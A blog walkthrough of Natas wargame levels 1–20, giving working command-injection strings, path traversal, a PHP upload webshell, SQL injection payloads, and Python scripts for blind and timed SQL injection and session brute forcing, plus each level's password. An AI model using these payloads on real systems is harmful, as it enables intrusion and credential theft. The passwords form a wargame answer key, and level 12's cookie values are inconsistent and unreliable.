---
aliases:
- /tech/2017/06/17/natas
date: 2017-06-17
layout: post
title: Natas wargame walkthrough, levels 1-20
---

One of my objectives while I'm at the
[Recurse Center]({% post_url tech/2017-05-23-starting-at-recurse-center %})
is to improve my knowedge of securing computer systems. A good way of learning
this is to play an attacker and to try to break into insecure systems[^1]. I've
been working through [Natas](http://overthewire.org/wargames/natas/), a
'wargame' developed by [Over The Wire](http://overthewire.org/wargames/). Natas
is a series of insecure webapps, which aim to teach the basics of web security.

This post covers solutions to the first twenty levels of Natas. The security
topics covered in these levels include:

- Editing HTTP headers
- Command injections
- File inclusion vulnerabilities
- Breaking weak encryption
- Editing cookies to assume the identity of a different user
- Bruteforce techniques
- SQL injections
- SQL tautologies
- Blind SQL injections
- Timed blind SQL injections

## 1

Password is in a comment in the page's HTML source.

`gtVrDuiDfck831PqWsLEZy5gyDz1clto`

## 2

Identical to level [1](#1), but right-click has been
disabled. Use browser shortcuts to open the debugger.

`ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`

## 3

Source reveals a hidden image located at `/files/pixel.png`. Navigating to
`/files/`, we see the file `/files/users.txt` which contains the password.

`sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`

## 4

A comment in the source says:

`[...] Not even Google will find it this time...`

Google indexes the web, but honours a site's `robots.txt` file, which tells
crawlers not to visit web pages. The `robots.txt` excludes the contents of
`/s3cr3t/`. Looking in this folder we find a file `user.txt` which contains the
password.

`Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`

## 5

The webapp notes that:

```
authorized users should come only from
"http://natas5.natas.labs.overthewire.org/"
```

We can trick the server into thinking we've come from that URL by adding the
Referer header to our HTTP request:

```
Referer: http://natas5.natas.labs.overthewire.org/
```

`iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`

## 6

Inspecting the site, we see that the following cookie has been set:

```javascript
loggedin=0
```

Change this cookie to 1, and the password is returned.

`aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`

## 7

In the source code, we see an included file `/includes/secret.inc`. Navigating
to this page, we see that the secret is `FOEIUWGHFEEUHOFUOIU`.
Enter this secret to get the password.

`7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`

## 8

A clue in the source says that the password we're looking for is stored at
`/etc/natas_webpass/natas8` on the server. If we navigate to the Home or About
page, we can change the value of page in the URL query to hit other files on
disk. The query `?page=../../../../etc/natas_webpass/natas8` reveals the
password.

`DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`

## 9

Looking at the source code, we see that the secret, when encoded must match:
`3d3d516343746d4d6d6c315669563362`. To find out the clear text secret,
we can reverse the encoding steps:

```php
<?php
> hex2bin("3d3d516343746d4d6d6c315669563362");
"==QcCtmMml1ViV3b"
> strrev("==QcCtmMml1ViV3b");
"b3ViV1lmMmtCcQ=="
> base64_decode("b3ViV1lmMmtCcQ==");
"oubWYf2kBq"
```

Submit this secret to see the password.

`W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`

## 10

In this level, user input is passed to the PHP
[passthru](https://secure.php.net/manual/en/function.passthru.php) function:

```php
passthru("grep -i $key dictionary.txt");
```

We can terminate the `grep` with a semicolon, run an arbitrary command, and
comment any code that comes after with:

```sh
; cat /etc/natas_webpass/natas10 #
```

Here, we return the contents of the password file with `cat`:

`s09byvi8880wqhbnonMFMW8byCojm8eA`

## 11

This level is the same as level [10](#10), but the characters `;`, `|` and `&`
are blocked by the server. We can utilise the `grep` to search for everything
in the password file:

```sh
.* /etc/natas_webpass/natas11 #
```

`SUIRtXqbB3tWzTOgTAX2t8UfMbYKrgp6`

## 12

In this level, we need to set a cookie, such that when it is base64 decoded and
XOR decrypted with an unkown key, it returns the JSON string:

```json
{"showpassword":"yes","bgcolor":"#ffffff"}
```

To do this, we need to work out the XOR encryption key. Luckily, XOR encryption
has the following property:

```
secret XOR key = encrypted_secret
encrypted_secret XOR secret = key
```

This property means that if we know a secret and the value it gets encrypted to,
we can work out the key.

Looking through the server source code, we see that the default secret is:

```json
{"showpassword":"no","bgcolor":"#ffffff"}
```

And by looking at the cookie returned, we can see that the encrypted secret is:

```
ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
```

We can perform the XOR with the following code:

```php
<?php
$origData = base64_decode(
    "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=");
$key = '{"showpassword":"no","bgcolor":"#ffffff"}';
$outText = "";
for ($i = 0; $i < strlen(origData); $i++) {
    $outText .= $origData[$i] ^ $key[$i % strlen($key)];
}
echo $outText;
```

Running this gives the output:

```
qw8Jqw8J
```

We see that this is the string `qw8J` repeated. We then use this key to encrypt
our original JOSN string:

```php
<?php
// xor_encrypt is taken from the server source code
function xor_encrypt($in) {
    $key = 'qw8J';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
echo base64_encode(xor_encrypt('{"showpassword":"yes","bgcolor":"#ffffff"}'));
```

This gives our desired cookie, `EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`. We set this
by running the following JavaScript in the browser console:

```javascript
document.cookie = "data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK";
```

Clicking on the `set color` button returns the password:

`EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`

## 13

In this level, a file is uploaded to the server, via an HTML form. Looking at
the source code, we see that the form has a few elements, which are initially
hidden:

```php
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
```

When writing the file to disk, the server code generates a random name for the
file. However, the extension given to the file is pulled from the hidden
`filename` input box in the form. If we set the extension of the file in the
form, that extension will be used to store our file on disk.

Different extensions cause the server to handle the file in different ways. A
`.jpg` extension will cause the server to serve the file as a static image, but
a `.php` extension will cause it to execute it as a PHP file.

We can therefore get the password by changing the text of the `filename` input
to `file.php` uploading the file:

```php
<?php
passthru('cat /etc/natas_webpass/natas13');
```

Submitting the form
displays a link to the file. When we click on the link, the PHP code is executed
and the password is displayed.

> jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

## 14

This level is similar to `13`, with the difference that the server side code now
runs the function `exif_imagetype` on the uploaded file to check if it's really
an image.

`exif_imagetype` works by reading the first few bytes from a file to check if
they match what the first few bytes of a `jpeg`, `gif`, `png` etc file are meant
to be. We can therefore trick the function by supplying a file which starts
with the first few bytes of an image format. For example, `jpeg` files start
with the number `0xFFD8FFE0`. We can create a `php` script with the correct
starting bytes with the following `python` code:

```python
with open("script.php", "w") as f:
    f.write('\xFF\xD8\xFF\xE0')
    f.write("""<?php
passthru('cat /etc/natas_webpass/natas14');
""")
```

Uploading this file and changing the `filename` input extension to `.php` as
before prints out the password.

> Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

## 15

Level 15 features a SQL injection attack. The following query is executed
against a MySQL database:

```php
<?php
$query = "SELECT * from users where username=\""
    .$_REQUEST["username"]
    ."\" and password=\""
    .$_REQUEST["password"]."\"";
```

We can see that the `username` and `password` sections of the query string
aren't sanitised. If a request is made that returns > 0 rows, the password
is printed. Supplying the `debug` keyword in the query string prints out the
query which is to be executed, making it easier to debug.

Looking at the query, need to construct a statement which reutrns a row.

The statement:

```sql
SELECT * from users where username="" or "1"="1" and password="" or "1"="1"
```

Makes use of SQL tautologies to return rows.

We can run this command by calling the URL with the following query string:

```
?username=%22%20or%20%221%22=%221&password=%22%20or%20%221%22=%221&debug
```
Running this prints out the password.

`AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`

## 16

Level 16 also features a SQL injection attack. This time, we are presented with
a simple web app which tells the user whether a sumbitted username exists in
a database. From the source, we see that the database also contains the
user's password.

We can construct a SQL query which leaks information about the user's password.
The following query makes use of the MySQL `LIKE` function, which pattern
matches a field.

```sql
SELECT * from users where username="natas16" AND password LIKE BINARY "a%"
```

The query tests whether there is a user named `natas16`, with a password that
starts with the letter `a`. If there is, the webpage says "This user exists".
If there isn't the webpage says "This user doesn't exist". The web app leaks
some information about the password. We can then repeat this query checking for
the letters `b, c, ...`, until we find a match. We can then repeat the process
for the second characted, and repeat that until we have the full password.

The following code does this:

```python
# -*- coding: utf-8 -*-

import logging
import string
import sys

import requests
from bs4 import BeautifulSoup


logging.basicConfig(level=logging.DEBUG, stream=sys.stderr)
logger = logging.getLogger(__name__)
# Silence noisy urllib3 debug logs
logging.getLogger("urllib3").setLevel(logging.CRITICAL)


def get_page_text(query_dict):
    query_dict["debug"] = "1"
    r = requests.get(
        "http://natas15.natas.labs.overthewire.org",
        auth=("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"),
        params=query_dict)
    return r.text


def does_user_exist(body):
    html = BeautifulSoup(body, "html.parser")
    text = html.find(id="content").get_text().strip()
    logger.debug(text)
    return "This user exists" in text


def get_next_char(index, possible_chars):
    next_index = index + 1
    return next_index, possible_chars[index]


def get_password():
    # All previous passwords contined only numbers and lower/upper case
    # letters. Let's assume that the same is true for this password.
    possible_chars = "".join([
        string.lowercase,
        string.uppercase,
        "".join(map(str, range(10)))
    ])

    password = ""
    index = 0
    while True:
        try:
            index, char = get_next_char(index, possible_chars)
        except IndexError:
            # None of the chars matched, assume that the password has been
            # guessed.
            return password
        password_guess = "".join([password, char, "%"])
        text = get_page_text({
            "username":
                'natas16" AND password LIKE BINARY "{0}'.format(password_guess),
            "debug": "true"
        })
        if does_user_exist(text):
            password = "".join([password, char])
            logging.info("password: %s", password)
            index = 0


def main():
    print get_password()


if __name__ == "__main__":
    main()
```

Running the script prints out the password.

`WaIHEacj63wnNIBROHeqi3p9t0m5nhmh`

## 17

This level is similar to the previous one. The web app is the same as the one
from levels [10](#10) and [11](#11), but it returns an error if any of the
characters `;`, `|`, `&`, `` ` ``, `\`, `'`, and `"`.
are used. We can, however, make use of shell varible expansions:

```sh
grep -i "$(grep -E ^a.* /etc/natas_webpass/natas17)aprils" dictionary.txt
```

If the password doesn't start with the letter 'a', the grep inside the
variable expansion returns nothing, and the outer grep searches for 'aprils',
which it finds in dictionary.txt. If however, the password does start with 'a',
the grep will return the password, and the outer grep will search for
`axxxaprils` (where `xxx` represents the rest of the characters in the password)
, which it won't find, so will return nothing. We can repeat
this process for all letters as before.

The code to do this is very similar to the code from level [16](#16):

```python
# -*- coding: utf-8 -*-

import logging
import string
import sys

import requests
from bs4 import BeautifulSoup


logging.basicConfig(level=logging.DEBUG, stream=sys.stderr)
logger = logging.getLogger(__name__)
# Silence noisy urllib3 debug logs
logging.getLogger("urllib3").setLevel(logging.CRITICAL)


def get_page_text(query_dict):
    query_dict["debug"] = "1"
    r = requests.get(
        "http://natas16.natas.labs.overthewire.org",
        auth=("natas16", "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"),
        params=query_dict)
    return r.text


def does_user_exist(body):
    html = BeautifulSoup(body, "html.parser")
    text = html.body.div.pre.get_text().strip()
    logger.debug(text)
    return text != "Aprils"


def get_next_char(index, possible_chars):
    next_index = index + 1
    return next_index, possible_chars[index]


def get_password():
    # All previous passwords contined only numbers and lower/upper case
    # letters. Let's assume that the same is true for this password.
    possible_chars = "".join([
        string.lowercase,
        string.uppercase,
        "".join(map(str, range(10)))
    ])

    password = ""
    index = 0
    while True:
        try:
            index, char = get_next_char(index, possible_chars)
        except IndexError:
            # None of the chars matched, assume that the password has been
            # guessed.
            return password
        password_guess = "".join([password, char])
        text = get_page_text({
            "needle": "$(grep -E ^{0}.* /etc/natas_webpass/natas17)aprils".format(
                password_guess),
            "debug": "true"
        })
        if does_user_exist(text):
            password = "".join([password, char])
            logging.info("password: %s", password)
            index = 0


def main():
    print get_password()


if __name__ == "__main__":
    main()
```

This returns the password.

`8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw`

## 18

This level is similar to [16](#16), except this time no data is printed out if a
query returns data or not. We can solve this with a timed blind SQL injection.

```sql
SELECT * from USERS where username="natas18"
AND IF(password LIKE BINARY "a%", SLEEP(2), 0)
```

This query checks if user `natas18`'s password starts with the letter 'a'. If
it does, then sleep for two seconds, else do nothing. By timing the requests,
we can tell if we have a match.

```python
# -*- coding: utf-8 -*-

import logging
import string
import sys
import time

import requests
from bs4 import BeautifulSoup


logging.basicConfig(level=logging.DEBUG, stream=sys.stderr)
logger = logging.getLogger(__name__)
# Silence noisy urllib3 debug logs
logging.getLogger("urllib3").setLevel(logging.CRITICAL)


def time_get_page(query_dict):
    logger.debug("running: {0}".format(query_dict["username"]))
    query_dict["debug"] = "1"
    start = time.time()
    r = requests.get(
        "http://natas17.natas.labs.overthewire.org",
        auth=("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"),
        params=query_dict)
    end = time.time()
    elapsed = end - start
    return elapsed


def get_password():
    # All previous passwords contined only numbers and lower/upper case
    # letters. Let's assume that the same is true for this password.
    possible_chars = "".join([
        string.lowercase,
        string.uppercase,
        "".join(map(str, range(10)))
    ])

    password = ""
    index = 0
    while True:
        if len(password) == 32:
            return password
        sql_query = \
            'natas18" AND IF(password LIKE BINARY "{0}", SLEEP(2), 0) #'
        password_times = {
            time_get_page({
                "username": sql_query.format("".join([password, char, "%"])),
                "debug": "true"
            }): char
            for char in possible_chars
        }
        longest_time = max(password_times)
        password = "".join([password, password_times[longest_time]])
        logging.info("password: %s", password)


def main():
    print get_password()


if __name__ == "__main__":
    main()
```

The password is:

`xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP`

## 19

In this level, we must supply admin credentials to be shown the password
for the next level. Looking through the source code, we see that we can bypass
supplying admin credentials if we can trick the server into thinking we have
already logged in by setting the `PHPSESSID` cookie to the session id of an
admin account. We don't know the admin session number, but we can brute force
it by trying out session numbers. A comment in the code says that there are
only a 640 possible sessions.

```python
# -*- coding: utf-8 -*-

import logging
import sys

import requests
import concurrent.futures


logging.basicConfig(level=logging.INFO, stream=sys.stderr)
logger = logging.getLogger(__name__)
# Silence noisy urllib3 debug logs
logging.getLogger("urllib3").setLevel(logging.CRITICAL)


def get_page_text(session_num):
    logger.debug(session_num)
    r = requests.get(
        "http://natas18.natas.labs.overthewire.org",
        auth=("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"),
        cookies={"PHPSESSID": str(session_num)})
    if "You are an admin." in r.text:
        logger.info("Admin session: %d", session_num)
        print r.text


def main():
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        executor.map(get_page_text, range(640))


if __name__ == "__main__":
    main()
```

This code makes use of concurrency to speed up execution.

Password is:

`4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs`

## 20

Same as the level [19](19), but the cookies are now non-sequential. By logging
in a few times, we notice that the cookie is a hex-encoded string
`<session number>-<username>`. Using this information, we can brute force the
problem as before.

```python
# -*- coding: utf-8 -*-

import logging
import sys

import requests
import concurrent.futures


logging.basicConfig(level=logging.INFO, stream=sys.stderr)
logger = logging.getLogger(__name__)
# Silence noisy urllib3 debug logs
logging.getLogger("urllib3").setLevel(logging.CRITICAL)


def str_to_hex(string):
    char_codes = [ord(c) for c in string]
    hex_codes = [hex(c) for c in char_codes]
    clean_hex_codes = [h.split("0x")[1] for h in hex_codes]
    return "".join(clean_hex_codes)


def get_page_text(session_num):
    logger.debug(session_num)
    encoded_session_num = str_to_hex("-".join([str(session_num), "admin"]))
    r = requests.get(
        "http://natas19.natas.labs.overthewire.org",
        auth=("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"),
        cookies={"PHPSESSID": str(encoded_session_num)})
    if "You are an admin." in r.text:
        logger.info("Admin session: %d", session_num)
        print r.text


def main():
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(get_page_text, range(640))


if __name__ == "__main__":
    main()
```

`eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF`

[^1]: Hacking into systems without explicit permission is illegal.
